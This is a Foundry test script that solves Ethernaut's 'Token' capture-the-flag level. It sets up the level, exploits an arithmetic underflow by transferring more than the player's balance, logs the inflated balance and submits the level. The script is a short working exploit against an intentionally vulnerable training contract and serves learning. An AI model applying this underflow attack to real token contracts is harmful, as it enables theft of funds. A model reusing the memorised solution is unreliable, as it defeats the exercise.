// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/5-Token/TokenFactory.sol";
import "../src/Ethernaut.sol";

contract TokenTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(100);
    address toAddress = address(200);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 5 ether);
    }

    function testTokenHack() public {
        // Level setup
        TokenFactory tokenFactory = new TokenFactory();
        ethernaut.registerLevel(tokenFactory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance(tokenFactory);
        Token ethernautToken = Token(payable(levelAddress));

        // Level attack
        emit log_named_uint("Balance before transfer", ethernautToken.balanceOf(eoaAddress));
        ethernautToken.transfer(toAddress, tokenFactory.PLAYER_SUPPLY() + 10);
        emit log_named_uint("Balance after transfer", ethernautToken.balanceOf(eoaAddress));

        // Level submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}